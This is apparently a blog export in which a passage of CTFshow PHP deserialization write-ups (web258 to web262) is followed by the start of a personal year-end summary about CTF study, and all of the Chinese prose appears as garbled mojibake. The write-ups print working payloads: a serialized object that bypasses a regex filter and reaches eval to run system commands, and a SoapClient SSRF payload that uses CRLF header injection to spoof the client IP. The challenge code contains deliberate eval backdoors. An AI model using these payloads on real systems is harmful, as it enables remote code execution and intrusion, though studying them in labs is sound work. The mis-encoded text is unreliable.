å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œæ‰€ä»¥éå¸¸é€‚åˆåœ¨ä½¿ç”¨å¯¹è±¡ä¹‹å‰åšä¸€äº›åˆå§‹åŒ–å·¥ä½œ*/\nclass Demo{\n    public $name=\"lww\";\n    public $age=20;\n    public function __construct(){\n        $this->name=\"Demon\";\n        $this->age=21;\n        echo \"constructè¢«è°ƒç”¨\\n\";\n    }\n}\n$a=new Demo();\necho serialize($a);\n/*\nconstructè¢«è°ƒç”¨*/\n\n\nO:4:\"Demo\":2:{s:4:\"name\";s:5:\"Demon\";s:3:\"age\";i:21;}\n\n```\n\n#### web258\n\n```php\n <?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n    public $class = 'info';\n\n    public function __construct(){\n        $this->class=new info();\n    }\n    public function login($u,$p){\n        return $this->username===$u&&$this->password===$p;\n    }\n    public function __destruct(){\n        $this->class->getInfo();\n    }\n\n}\n\nclass info{\n    public $user='xxxxxx';\n    public function getInfo(){\n        return $this->user;\n    }\n}\n\nclass backDoor{\n    public $code;\n    public function getInfo(){\n        eval($this->code);\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])){\n        $user = unserialize($_COOKIE['user']);\n    }\n    $user->login($username,$password);\n}\n```\n\n```php\nåˆ†æï¼š\næœ¬é¢˜çš„éš¾ç‚¹åœ¨äºè¿‡æ»¤\nif(isset($username) && isset($password)){\n    if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])){\n        $user = unserialize($_COOKIE['user']);\n    }\n    $user->login($username,$password);\n}\næ­£åˆ™è¿‡æ»¤[oc]æ˜¯åŒ¹é…oå­—ç¬¦æˆ–è€…cå­—ç¬¦ï¼Œ\\dåŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ï¼Œç­‰ä»·äº[0-9]ï¼Œ+å·æ˜¯åŒ¹é…å‰é¢çš„\\dä¸€æ¬¡æˆ–è€…å¤šæ¬¡ã€‚ä¸‹é¢åªéœ€è¦å°†O:11å˜æˆO:+11å°±å¯ä»¥ç»•è¿‡äº†\næ£€æŸ¥ $_COOKIE['user'] è¿™ä¸ª Cookie çš„å€¼æ˜¯å¦ä¸åŒ…å«ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼ /[oc]:\\d+:/i çš„æ¨¡å¼ã€‚å¦‚æœä¸åŒ…å«ï¼Œåˆ™æ¡ä»¶ä¸ºçœŸï¼Œæ‰§è¡Œ if è¯­å¥å—å†…çš„ä»£ç ï¼›å¦‚æœåŒ…å«ï¼Œåˆ™æ¡ä»¶ä¸ºå‡ï¼Œè·³è¿‡ if è¯­å¥å—å†…çš„ä»£ç ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œè¿™ç§æ£€æŸ¥é€šå¸¸ç”¨äºé˜²èŒƒ PHP ååºåˆ—åŒ–æ¼æ´ï¼Œå› ä¸ºæŸäº›æ¶æ„çš„åºåˆ—åŒ–å­—ç¬¦ä¸²å¯èƒ½åŒ…å« O: æˆ– C: å¼€å¤´çš„æ¨¡å¼ã€‚\nä¸ºäº†èº²é¿æ£€æŸ¥+11å¯ä»¥èº²å¼€\\dçš„çº¯æ•°å­—å­—ç¬¦\n```\n\n```php\npayload:\nuser=O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%27tac+f%2A%27%29%3B%22%3B%7D%7D\n<?php\nclass ctfShowUser{\n    public $class;\n    public function __construct(){\n        $this->class=new backDoor();\n    }\n}\nclass backDoor{\n    public $code=\"system('tac f*');\";\n}\n$a=new ctfShowUser();\n$b=serialize($a);\n$b=str_replace(\"O:\",\"O:+\",$b);\necho urlencode($b);\n```\n\n#### WEB259\n\nè¿™é¢˜è€ƒæŸ¥PHPåŸç”Ÿç±»çš„ååºåˆ—åŒ–\n\nå…ˆæ”¾é¢˜\n\n```\nflag.php \n$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\narray_pop($xff);\n$ip = array_pop($xff);\n\n\nif($ip!=='127.0.0.1'){\n\tdie('error');\n}else{\n\t$token = $_POST['token'];\n\tif($token=='ctfshow'){\n\t\tfile_put_contents('flag.txt',$flag);\n\t}\n}\n\nç„¶åå®ä¾‹é‡Œé¢çš„phpé¡µé¢æ˜¯\n<?php\n\nhighlight_file(__FILE__);\n\n\n$vipÂ =Â unserialize($_GET['vip']);\n//vipÂ canÂ getÂ flagÂ oneÂ key\n$vip->getFlag();\n\n```\n\n\n\nå¤§è‡´æµç¨‹ä¸ºï¼š\n\n1ã€é€šè¿‡è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè°ƒç”¨åŸç”Ÿç±»SoapClientçš„_callæ–¹æ³•\n\n2ã€é€šè¿‡SoapClientåŸç”Ÿç±»é‡Œé¢å¸¦æœ‰çš„user_agentæ„é€ å¤„POSTæ–¹æ³• \n\n3ã€User-Agentå’ŒContent-Typeé—´é€šè¿‡\\r\\nåˆ†å‰²ï¼Œå› ä¸ºåœ¨HTTPåè®®ä¸­ï¼ŒHTTP headerä¸HTTP Bodyæ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ \n\n4ã€åˆ©ç”¨å…¶ä¸­çš„locationä¸ºhttp://127.0.0.1/flag.phpï¼Œæ„é€ SSRFï¼Œå¯ä»¥è®©è®¿é—®flag.phpçš„IPä¸º127.0.0.1\n\n> [!TIP]\n>\n> ## å…³äºphpåŸç”Ÿç±»\n>\n> ```\n> PHP åŸç”Ÿç±»ï¼ˆNative Classesï¼‰æ˜¯æŒ‡ PHP è¯­è¨€å†…ç½®çš„ç±»ï¼Œç”± PHP æ ¸å¿ƒæˆ–å®˜æ–¹æ‰©å±•ç›´æ¥æä¾›ï¼Œæ— éœ€ç”¨æˆ·è‡ªè¡Œå®šä¹‰å³å¯ç›´æ¥ä½¿ç”¨ã€‚è¿™äº›ç±»é€šå¸¸æä¾›äº†å¸¸ç”¨çš„åŠŸèƒ½ï¼ˆå¦‚æ—¥æœŸå¤„ç†ã€æ–‡ä»¶æ“ä½œã€å¼‚å¸¸å¤„ç†ç­‰ï¼‰ï¼Œæ˜¯ PHP å¼€å‘ä¸­çš„åŸºç¡€å·¥å…·ã€‚\n> ä¸»è¦ç‰¹ç‚¹\n> æ— éœ€å®šä¹‰ï¼šåŸç”Ÿç±»å·²éš PHP å®‰è£…åŒ…æˆ–æ‰©å±•é»˜è®¤æä¾›ã€‚\n> é«˜æ•ˆç¨³å®šï¼šç»è¿‡ PHP å®˜æ–¹ä¼˜åŒ–å’Œæµ‹è¯•ï¼Œæ€§èƒ½å¯é ã€‚\n> åŠŸèƒ½æ˜ç¡®ï¼šæ¯ä¸ªç±»ä¸“æ³¨äºè§£å†³ç‰¹å®šé¢†åŸŸçš„é—®é¢˜ã€‚\n> ```\n>\n> Y4tackerçš„[ååºåˆ—åŒ–æ€»ç»“](https://y4tacker.blog.csdn.net/article/details/113588692?spm=1001.2014.3001.5502)é‡Œé¢çš„phpåŸç”Ÿç±»ååºåˆ—åŒ–æ¿å—æœ‰è¯¦è§£ï¼Œå†…å®¹å¯èƒ½è¾ƒå¤š\n\n```php\npayload:\n<?php\n \n$ua=\"ctfshow\\r\\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\";\n \n$client=new SoapClient(null,array('uri'=>\"127.0.0.1/\",'location'=>\"http://127.0.0.1/flag.php\",'user_agent'=>$ua));\n \necho urlencode(serialize($client))\n \n?>\n\n/*\n?vip=O%3A10%3A\"SoapClient\"%3A5%3A%7Bs%3A3%3A\"uri\"%3Bs%3A10%3A\"127.0.0.1%2F\"%3Bs%3A8%3A\"location\"%3Bs%3A25%3A\"http%3A%2F%2F127.0.0.1%2Fflag.php\"%3Bs%3A15%3A\"_stream_context\"%3Bi%3A0%3Bs%3A11%3A\"_user_agent\"%3Bs%3A138%3A\"ctfshow%0D%0Ax-forwarded-for%3A127.0.0.1%2C127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContent-Length%3A13%0D%0A%0D%0Atoken%3Dctfshow\"%3Bs%3A13%3A\"_soap_version\"%3Bi%3A1%3B%7D\nç„¶åè®¿é—®flag.txt\n\n\n```\n\n#### WEB260\n\n```php\n<?php\n\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nif(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){\n    echo $flag;\n}\n```\n\nç›´æ¥ä¼ å…¥?ctfshow= ctfshow_i_love_36Då°±è¡Œ\n\n#### WEB261\n\n```php\n<?php\n\nhighlight_file(__FILE__);\n\nclass ctfshowvip{\n    public $username;\n    public $password;\n    public $code;\n\n    public function __construct($u,$p){\n        $this->username=$u;\n        $this->password=$p;\n    }\n    public function __wakeup(){\n        if($this->username!='' || $this->password!=''){\n            die('error');\n        }\n    }\n    public function __invoke(){\n        eval($this->code);\n    }\n\n    public function __sleep(){\n        $this->username='';\n        $this->password='';\n    }\n    public function __unserialize($data){\n        $this->username=$data['username'];\n        $this->password=$data['password'];\n        $this->code = $this->username.$this->password;\n    }\n    public function __destruct(){\n        if($this->code==0x36d){\n            file_put_contents($this->username, $this->password);\n        }\n    }\n}\n\nunserialize($_GET['vip']); \n\n\nè€ƒç‚¹ï¼š\n    å¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† __unserialize() å’Œ __wakeup() ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œ åˆ™åªæœ‰ __unserialize() æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ__wakeup() æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚\n```\n\n\n\n#### WEB262\n\nå­—ç¬¦ä¸²é€ƒé€¸\n\n```php\n<?php\n\n\n\nerror_reporting(0);\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this->from = $f;\n        $this->msg = $m;\n        $this->to = $t;\n    }\n}\n\n$f = $_GET['f'];\n$m = $_GET['m'];\n$t = $_GET['t'];\n\nif(isset($f) && isset($m) && isset($t)){\n    $msg = new message($f,$m,$t);\n    $umsg = str_replace('fuck', 'loveU', serialize($msg));\n    setcookie('msg',base64_encode($umsg));\n    echo 'Your message has been sent';\n}\n\nhighlight_file(__FILE__);\n\n```\n\nè¿™æ®µ PHP ä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯æ¥æ”¶æ¥è‡ªç”¨æˆ·é€šè¿‡ GET è¯·æ±‚ä¼ é€’çš„ä¸‰ä¸ªå‚æ•° `f`ã€`m` å’Œ `t`ï¼Œå¹¶ä½¿ç”¨è¿™äº›å‚æ•°åˆ›å»ºä¸€ä¸ª `message` ç±»çš„å¯¹è±¡ã€‚åœ¨åˆ›å»ºå¯¹è±¡åï¼Œå°†å¯¹è±¡åºåˆ—åŒ–ï¼ŒæŠŠåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„ `fuck` æ›¿æ¢ä¸º `loveU`ï¼Œå†å¯¹å¤„ç†åçš„å­—ç¬¦ä¸²è¿›è¡Œ Base64 ç¼–ç ï¼Œæœ€åå°†ç¼–ç åçš„ç»“æœä½œä¸ºä¸€ä¸ªåä¸º `msg` çš„ Cookie å‘é€ç»™ç”¨æˆ·ã€‚åŒæ—¶ï¼Œä»£ç è¿˜ä¼šè¾“å‡ºä¸€æ¡æ¶ˆæ¯æç¤ºç”¨æˆ·æ¶ˆæ¯å·²å‘é€ï¼Œå¹¶å°†å½“å‰ PHP æ–‡ä»¶çš„æºä»£ç é«˜äº®æ˜¾ç¤ºå‡ºæ¥ã€‚\n\n","tags":["-php -ååºåˆ—åŒ– -web"]},{"title":"2024å¹´ç»ˆæ€»ç»“","url":"/2025/01/29/2024å¹´ç»ˆæ€»ç»“/","content":"\n\n\nå…¶å®çœ‹åˆ°å¤§å¸ˆå‚…ä»¬åœ¨å…ƒæ—¦çš„æ—¶å€™å†™å¹´ç»ˆæ€»ç»“æˆ‘å°±å¾ˆæ˜¯ç¾¡æ…•ï¼Œä½†æ˜¯å½“æ—¶è‡ªå·±æ²¡æœ‰blogå¹¶ä¸”ä¹Ÿå†™äº†ä¹Ÿä¸çŸ¥é“ç»™è°çœ‹æ‰€ä»¥å°±ä¸€ç›´æ‹–ç€æ²¡å†™ï¼Œä½†æ˜¯æˆ‘æ„Ÿè§‰è¿™ä¸€å¹´æˆ‘æœ‰å¥½å¤šäº‹æƒ…æƒ³å†™ä¸‹æ¥è®°å½•ä¸‹æ¥\n\n## äºŒæœˆ\n\nè¿™ä¸ªæ—¶å€™æˆ‘è¿˜åœ¨æ¢¦æƒ³ç€å¦‚æœå¤§å­¦æœŸé—´èƒ½å¤Ÿæ‹¿ä¸€ä¸ªå›½å¥–è¯¥æ˜¯å¤šä¹ˆç‰›é€¼çš„å­˜åœ¨ï¼Œæˆ‘çš„ç›®æ ‡ç´§ç´§ç›¯ä½24çš„åä¸ºICTå¤§èµ›ï¼Œå¹»æƒ³ç€æš‘å‡çŒ›çŒ›å­¦ä¸€æ³¢ä¹‹åæ€è¿›å›½èµ›ï¼ŒåŒæ—¶æˆ‘ä¹Ÿæ·±æ·±å¯¹ä»¥åæ„Ÿåˆ°é¡¾è™‘ï¼Œæˆ‘å»é’å²›çš„çº¿ä¸‹è¯¾ç¨‹ç­å­¦ä¹ ï¼Œä½†æ˜¯æ•ˆæœè¿˜æ˜¯å¾ˆä¸€èˆ¬ï¼Œåªæ˜¯æŠŠHCIPå­¦åˆ°ä¸ƒå…«æˆçš„æ ·å­ã€‚\n\n## ä¸‰æœˆ\n\nå¼€å­¦çš„æ—¶å€™è·Ÿå‚»å­ä¸€æ ·å¸®ç­é‡Œçš„åŒå­¦æ¬ä¹¦ï¼Œç»™æˆ‘ç´¯æ­»äº†æˆ‘å†³å®šä»¥åå†ä¹Ÿä¸ä¼šå¸®å¿™æ¬ä¹¦äº†ï¼Œç„¶åæœ€è®©æˆ‘æ„Ÿåˆ°å‹åŠ›çš„æ˜¯è¿™ä¸ªæœˆæˆ‘å¼€å§‹æ•´å¤§å­¦ç”Ÿåˆ›æ–°åˆ›ä¸šè®¡åˆ’äº†ï¼Œåˆ˜æ–‡è£è€å¸ˆç»™æˆ‘æ´—è„‘å¿«æ´—ç–¯äº†ï¼Œç„¶åæˆ‘ä¹Ÿæ˜¯å› ä¸ºä¸æ•¢æ‹’ç»ç¡¬ç”Ÿç”Ÿæ¥ä¸‹äº†è¿™ä¸ªä»»åŠ¡å¼„äº†å·®ä¸å¤šä¸€ä¸ªå‘¨æ‰¾äº†ä¸€äº›èµ„æ–™å’Œç†è®ºç„¶ååŠ ä¸Šå¯¹ç½‘å·¥çš„ç†Ÿæ‚‰å’Œå¯¹å­¦æ ¡è€å¸ˆæ°´å¹³çš„è‡ªä¿¡æˆ‘å¼€é¢˜äº†ä¸€ä¸ªå«**åŸºäºOTNå’ŒVPNæŠ€æœ¯çš„æ•°æ®ä¼ è¾“ä¼˜åŒ–æ–¹æ¡ˆ**çš„é¡¹ç›®ä½†æ˜¯æˆ‘ç°åœ¨å›å¤´çœ‹æ„Ÿè§‰æŒºäºŒé€¼çš„ï¼Œä½†æ˜¯æˆ‘å¯¹è¿™ä¸ªé¡¹ç›®çš„è´¨é‡è¿˜æ˜¯æ¯”è¾ƒæœ‰ä¿¡å¿ƒçš„ï¼Œè°¢é£å¸†è€å¸ˆç»™çš„è¯„ä»·æ˜¯æˆ‘åšä¸å‡ºæ¥ï¼Œè¿™ä¸ªé¡¹ç›®çš„æ°´å‡†è‡³å°‘æ˜¯ä¸ªä¼˜ç§€çš„ç¡•å£«æ¯•ä¸šè®ºæ–‡ï¼Œå½“æ—¶ç»™æˆ‘è£…çˆ½äº†ï¼ŒåŒæ—¶ä¹Ÿæ˜¯è¿™å­¦æœŸwsqå­¦é•¿å¼€å§‹æ¥æ‰‹å®éªŒå®¤ï¼Œæˆ‘å¼€å§‹æ¥è§¦ctfã€‚\n\n![å¤§åˆ›æ–‡ä»¶æˆªå›¾.png](https://Liang-WW.github.io/images/202501/å¹´ç»ˆæ€»ç»“/å¤§åˆ›æ–‡ä»¶æˆªå›¾.png)\n\nä¸æ­¤åŒæ—¶æˆ‘ä¹Ÿè€ƒäº†è®¡ç®—æœºç­‰è€ƒçš„cè¯­è¨€äºŒçº§ï¼Œä½†æ˜¯åæ¥æ²¡è¿‡ï¼Œå“ˆå“ˆå…¶å®æˆ‘æ ¹æœ¬å°±æ˜¯æ°´é€¼å¹³æ—¶æœ‰ç‚¹ä¸œè¥¿å…¨ç”¨æ¥è£…é€¼äº†ã€‚\n\n## å››æœˆ\n\nå››æœˆä»½æœ€ä»¤æˆ‘å°è±¡æ·±åˆ»çš„å°±æ˜¯XYCTFäº†ï¼Œåˆ°ç°åœ¨æˆ‘ä¹Ÿè®¤ä¸ºXYCTFçš„é¢˜çœŸçš„å¾ˆåˆé€‚ï¼Œæˆ‘ä¹Ÿæ˜¯ä»è¿™ä¸ªæ—¶å€™å¼€å§‹æ­£å¼æ¥è§¦CTFï¼Œè¿™ä¸ªæ¯”èµ›ç»´æŒäº†ä¸€ä¸ªæœˆï¼Œæˆ‘çŸ¥é“äº†CTFåŸæ¥æ˜¯è¿™ä¹ˆä¸€å›äº‹ï¼Œä½†æ˜¯æˆ‘åŠªåŠ›äº†å¾ˆä¹…å¾ˆä¹…ä¹Ÿä¸èƒ½è‡ªå·±åšå‡ºæ¥é¢˜ç›®ï¼Œæˆ‘å’Œæˆ‘å½“æ—¶çš„æ­æ¡£çš„åˆ†å·¥å¤§æ¦‚æ˜¯ä»–ä¸»webæˆ‘ä¸»miscï¼Œå½“æ—¶å­¦ä¹ è¿˜å±äºæ˜¯åœ¨bç«™ä¸Šçœ‹ctfæ•™ç¨‹å‘¢ï¼Œä½†æ˜¯åˆ°ç°åœ¨æˆ‘ä¹Ÿæ²¡çœ‹å‡ ä¸ªå“ˆå“ˆï¼Œä¸€ä¸ªzipä¼ªåŠ å¯†æäº†å¥½å‡ å¤©æ‰æ˜ç™½ï¼Œè¿˜æœ‰çˆ†ç ´å¯†ç ä»€ä¹ˆçš„æˆ‘å¤©å¤©å°±æ˜¯è·Ÿåœ¨å­¦é•¿å±è‚¡ä¸Šè¦ç­”æ¡ˆï¼Œä»–åšå‡ºæ¥æˆ‘å°±é—®ä»–è¦ï¼Œä½†æ˜¯å½“æ—¶çš„å­¦é•¿ä¹Ÿæ˜¯å®åŠ›å¾ˆæœ‰é™ï¼Œä¹Ÿæ˜¯åœ¨è¿™ä¸ªæ—¶å€™æˆ‘å»æ‰¾å¾é™è€å¸ˆè¦æ™šè‡ªä¹ çš„å‡æ¡ä»¥åæ™šè‡ªä¹ å°±è½¬æˆ˜å®éªŒå®¤äº†\n\n## äº”æœˆ\n\nxyctfåœ¨åŠè·¯å°±è¢«å¤­æŠ˜äº†ï¼Œæˆ‘çš„é˜Ÿå‹ä¸çŸ¥é“ä»å“ªæ‰¾çš„wpäº¤äº†å¥½å‡ ä¸ªflagè¢«å°å·äº†ï¼Œå½“æ—¶åšé¢˜æ™•æ™•çš„ï¼Œæ¥ç€å°±æ˜¯isccçš„åˆ°æ¥ï¼Œäº”ä¸€å‡æœŸå°±å¼€å§‹åšisccè¿™æ˜¯å¤§å­¦ç”Ÿæ¦œå•ä¸Šçš„èµ›äº‹ï¼Œä¸æ­¤åŒæ—¶è¿˜æœ‰æˆ‘çš„æ ¡èµ›ä¹Ÿæ­£åœ¨è¿›è¡Œï¼Œwsqå­¦é•¿è´Ÿè´£å‡ºé¢˜ä¹Ÿç»™æˆ‘ä»¬é€äº†å¾ˆå¤šé¢˜ç›®ï¼Œä½†æ˜¯ä»–ç»™ä»–åŒç­çš„äººé€é¢˜é€æ›´å¤šï¼Œç„¶åæˆ‘å°±å’Œæˆ‘ä¹‹å‰çš„webæ‰‹æš—ä¸­äº¤æµæœ€åä¸¤ä¸ªäºŒç­‰å¥–ï¼Œç¬¬ä¸€åç«Ÿç„¶æ˜¯æˆ‘åŒç­çš„hyå¸ˆå‚…ï¼Œå½“æ—¶è§‰å¾—ä»–å¾ˆç‰›å¾ˆç‰›ï¼Œç„¶åè¿™ä¸€æœŸé—´webæ‰‹é»„åŒå­¦å’Œwsqé—¹æ°äº†æˆ‘å°±ä»ä¸­å¸®ä»–ä»¬äº¤æµï¼Œç„¶åå°±å¼€å§‹åšisccçš„é¢˜ç›®ï¼Œåˆšå¼€å§‹æ²¡æƒ³é‚£ä¹ˆå¤šï¼Œä½†æ˜¯åæ¥å°±å­¦ä¼šäº†é—²é±¼å­¦ä¼šäº†pyï¼Œè¿™ä¹Ÿæ˜¯æˆ‘å­¦çš„æœ€å¿«çš„æ—¶å€™ï¼Œæˆ‘æ‰€æœ‰çš„ç²¾åŠ›éƒ½æ”¾åœ¨æ€ä¹ˆå¤ç°é¢˜ç›®äº†ï¼Œå¾ˆå¤šä¸œè¥¿æ ¹æœ¬ä¸æ˜ç™½ï¼Œä½†æ˜¯å°±æ˜¯è·Ÿç€wsqå­¦é•¿æ¨¡ä»¿ï¼Œé‡åˆ°é—®é¢˜å°±æ¡†æ¡†é—®ï¼Œæ¡†æ¡†æŸ¥ã€‚æœ€åå‡ å¤©isccçš„wpéƒ½å˜æˆå…¬å…±çš„äº†ï¼Œäº”å—é’±å…¨éƒ½æœ‰ç„¶åæœ€åå‡ å¤©çš„æ—¶å€™å¤§å®¶éƒ½åœ¨å†²åˆºï¼ŒæœåŠ¡å™¨å°±æ²¡æœ‰æ­£å¸¸çš„æ—¶å€™\n\n![isccå’¸é±¼.jpg](https://Liang-WW.github.io/images/202501/å¹´ç»ˆæ€»ç»“/isccå’¸é±¼.jpg)\n\n## å…­æœˆ\n\nå…­æœˆæ˜¯æˆ‘çš„å™©æ¢¦ï¼Œæˆ‘æ‰“äº†CISCNï¼ŒçœŸæ˜¯å¤ªç—›è‹¦äº†ï¼Œå­¦é•¿pyè¿›å—äº¬çº¿ä¸‹äº†ï¼Œæˆ‘å› ä¸ºè‡ªå·±å¤ç°ä¸å‡ºæ¥é‚£ä¹ˆå¤šé¢˜é”™å¤±å»çº¿ä¸‹å—äº¬ï¼Œåç‰¢ä¸¤å¤©ï¼Œé˜Ÿå‹å› ä¸ºåç‰¢å¤ªéš¾å—äº†å°±ä¸æ¥äº†æˆ‘å¾ˆç”Ÿæ°”ä»æ­¤ä¹Ÿå¯¹å›½èµ›æœ‰ææƒ§æ„Ÿã€‚isccç»™æˆ‘å®šæ¦œ2016åå·®ä¸€ç‚¹ç‚¹å›½ä¸‰ï¼Œå½“æ—¶äººç”Ÿéƒ½å¾ˆé»‘æš—ï¼Œå¿ƒæƒ…å¾ˆå‹æŠ‘ã€‚é‚£ä¹ˆå¤šç¾å¥½çš„ä¸œè¥¿éƒ½ç†æˆ‘æ“¦è‚©è€Œè¿‡ã€‚\n\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä¸€å¹´ä¸‹æ¥ä»€ä¹ˆéƒ½æ²¡å¾—åˆ°ï¼Œæˆ‘çš„é‡å¿ƒéƒ½å˜æˆäº†ç¬‘è¯ï¼Œè€Œéš”å£å®éªŒå®¤çš„åŒå­¦éƒ½å·²ç»å¼€å§‹æ‹¿å¥–äº†ï¼Œæˆ‘ç”šè‡³ä¸ºäº†è®©æˆ‘ä¸‹å­¦æœŸæœ‰è¯„å¥–è¯„ä¼˜çš„èµ„æ ¼å»è°ƒæ¢äº†å®¿èˆ\n\n## ä¸ƒæœˆ\n\næœŸæœ«è€ƒè¯•å‡ºæˆç»©äº†è€ƒçš„å¾ˆä¸€èˆ¬ï¼Œæˆ‘æœ¬æ¥æƒ³äº‰å–å›½å®¶å¥–å­¦é‡‘çš„é›„å¿ƒå£®å¿—éƒ½ç¨€ç¢äº†ã€‚ç„¶åä¸€è¾¹æŒ‚ç€ç½‘è¯¾å¬åä¸ºä¸€è¾¹åˆå¼€å§‹ç©ç”µè„‘ï¼Œæ…¢æ…¢æ¥è§¦äº†srcï¼Œä¸€ç‹ å¿ƒç›´æ¥ä»˜è´¹å­¦ä¹ é’ŸåŒ—å±±ï¼Œç„¶åæ…¢æ…¢æ”¾å¼ƒç½‘å·¥çš„å­¦ä¹ ï¼Œè¿™ä¹Ÿæ„å‘³ç€æˆ‘ä¹‹å‰çš„å­¦ä¹ éƒ½æ‰“äº†æ°´æ¼‚\n\n## å…«æœˆ\n\næ­£å¼è¿›æ”»webï¼Œå¼€å§‹æŠ“åŒ…ï¼Œå¼€å§‹å°è¯•å±±ä¸œçœæ•™è‚²ç³»ç»Ÿæ”»é˜²æ¼”ç»ƒï¼Œå¼€å§‹å’Œèµµå¸ˆå‚…æ¥è§¦å˜å¤šï¼Œä»è¿™æ®µæ—¶é—´å¼€å§‹æˆ‘å°±ç»å¸¸éªšæ‰°èµµå¸ˆå‚…ï¼Œå› ä¸ºåˆ«äººä¸å¥½æ„æ€é—®ï¼Œè€Œä¸”èµµå¸ˆå‚…ä¼šæŒ–æ´ï¼Œå½“æ—¶æˆ‘å°±æƒ³å¦‚æœæˆ‘å¤§ä¸‰èƒ½æœ‰èµµå¸ˆå‚…çš„æ°´å¹³å°±å¥½äº†ï¼ŒåŒ—å±±å¸ˆå‚…ç»™çš„å…¥å­¦è€ƒè¯•æˆ‘ä¸€é“é¢˜ä¹Ÿä¸ä¼šï¼Œç„¶åç»™äº†æˆ‘ä¸€å¥—è¯¾è®©æˆ‘å­¦ä¹ ï¼Œè¿™æ®µæ—¶é—´æ˜¯æˆ‘å­¦ä¹ çš„æ—¶é—´ä¹Ÿæ˜¯æˆ‘è’åºŸçš„æ—¶é—´ï¼Œæˆ‘å¤©å¤©åœ¨å®¶é‡Œå‘Šè¯‰æ‰€æœ‰äººæˆ‘åœ¨å­¦ä¹ ä½†æ˜¯å®é™…ä¸Šæ¯å¤©çš„æœ‰æ•ˆå­¦ä¹ è¿˜ä¸åˆ°ä¸¤ä¸ªå°æ—¶ï¼Œä¸€ç›´åˆ°å¼€å­¦æˆ‘æ‰æ˜¯ä¼šä¸€ç‚¹sqlçš„åŸç†ï¼Œxssçš„åŸç†ï¼Œuploadæ–‡ä»¶ä¸Šä¼ çš„ä¸œè¥¿ï¼Œä¹Ÿæ˜¯åœ¨è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘é€æ¸æ„Ÿåˆ°ç½‘å®‰çš„é­…åŠ›ï¼Œä¹Ÿå­¦ä¼šäº†å¦‚ä½•å­¦ä¹ ã€‚\n\n## ä¹æœˆ\n\nå¼€å­¦äº†ï¼Œæˆ‘çš„webæ‰‹ä¸å¹²äº†ï¼Œæœ¬æ¥å°±æ˜¯æ¯”è¾ƒå¤æ€ªçš„äººï¼Œåæ¥åˆ˜æ–‡è£è€å¸ˆçŸ¥é“äº†ä»¥åå»å°è¯•è°ƒè§£ä¹Ÿæ²¡æˆåŠŸï¼Œå¥½åƒæ˜¯å› ä¸ºæˆ‘æ²¡æœ‰å¸®ä»–æŠ¥åæ¯”èµ›å¾—ç½ªä»–äº†ï¼Œå¾ˆæŠ½è±¡ã€‚è‡³æ­¤23çº§åªå‰©æˆ‘ä¸€äººå¹¶ä¸”åˆšåˆšå…¥é—¨ï¼Œå¼€å­¦å‡†å¤‡äº†ä¸€æ®µæ—¶é—´çš„è®¡ç®—æœºä¸‰çº§ä½†æ˜¯ä¹Ÿæ˜¯å¾ˆæ„å¤–çš„æ²¡è¿‡ï¼Œäºæ˜¯æˆ‘å†³å®šæˆ‘å†ä¹Ÿä¸ä¼šè€ƒè®¡ç®—æœºç­‰è€ƒäº†ï¼Œè¿™ä¸ªæœˆæŠŠå±±ä¸œçœèµ›æ‰“è¿›å»äº†ï¼Œå½“æ—¶è€å¸ˆæŠŠæ ¡é˜Ÿåé¢ç»™äº†å‡¯å“¥æˆ‘å¾ˆä¸æœå½“æ—¶è¿˜å’Œå‡¯å“¥ä¸è®¤è¯†,ç„¶åæˆ‘çªç„¶æ„è¯†åˆ°å¥½åƒåˆ°æˆ‘è´Ÿè´£ä»Šå¹´çš„æ–°ç”Ÿäº†ç„¶åæˆ‘å°±å¼€å§‹ç­¹å¤‡ï¼Œä¸€ä¸ªäººææ‰€æœ‰çš„ä¸œè¥¿çœŸçš„å¾ˆç´¯å¾ˆå´©æºƒ\n\næˆ‘è¿˜å½“å­¦ç”Ÿä»£è¡¨å’Œæ·±ä¿¡æœçš„äººå»äº†è§£å­¦æ ¡çš„åˆä½œï¼Œä½†æ˜¯æˆ‘æ„Ÿè§‰å¥½å‘äººï¼Œä¸å¦‚è‡ªå·±å­¦äº†ï¼Œå­¦æ ¡æŠŠé’±èŠ±åœ¨è¿™ç§åœ°æ–¹å¾ˆä¸å€¼å½“\n\n## 